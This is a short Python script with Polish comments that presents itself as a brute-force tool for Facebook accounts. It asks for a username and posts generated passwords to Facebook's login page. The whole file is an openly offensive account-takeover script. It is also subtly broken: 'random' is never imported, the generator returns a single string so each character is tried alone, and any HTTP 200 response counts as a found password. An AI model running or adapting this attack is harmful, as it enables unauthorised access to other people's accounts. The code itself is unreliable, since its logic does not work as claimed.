import requests
import time
import re
from bcrypt import hashpw, checkpw

def verify_password(password, hashed_password):
    return checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))

def generate_passwords(length=12, symbols=True, numbers=True, uppercase=True, lowercase=True):
    characters = []
    if symbols:
        characters += ['!', '@', '#', '$', '%', '&', '(', ')', '*', '+']
    if numbers:
        characters += ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    if uppercase:
        characters += [chr(i) for i in range(ord('A'), ord('Z') + 1)]
    if lowercase:
        characters += [chr(i) for i in range(ord('a'), ord('z') + 1)]
    return ''.join([random.choice(characters) for _ in range(length)])

def brute_force(username, fb_id, passwords):
    for password in passwords:
        # Wykonaj zapytanie do Facebooka
        response = requests.post('https://www.facebook.com/login.php', data={
            'email': username,
            'password': password,
            'login': 'Log In'
        })

        # Sprawdź odpowiedź
        if response.status_code == 200:
            # Hasło zostało znalezione
            print('Znaleziono hasło:', password)
            return

        # Hasło nie zostało znalezione
        print('Nieprawidłowe hasło:', password)

def main():
    # Pobierz dane użytkownika
    username = input('Podaj nazwę użytkownika: ')
    fb_id = input('Podaj identyfikator Facebooka: ')

    # Wygeneruj listę haseł
    passwords = generate_passwords(length=12, symbols=True, numbers=True, uppercase=True, lowercase=True)

    # Wykonaj atak siłowy
    brute_force(username, fb_id, passwords)

if __name__ == '__main__':
    main()










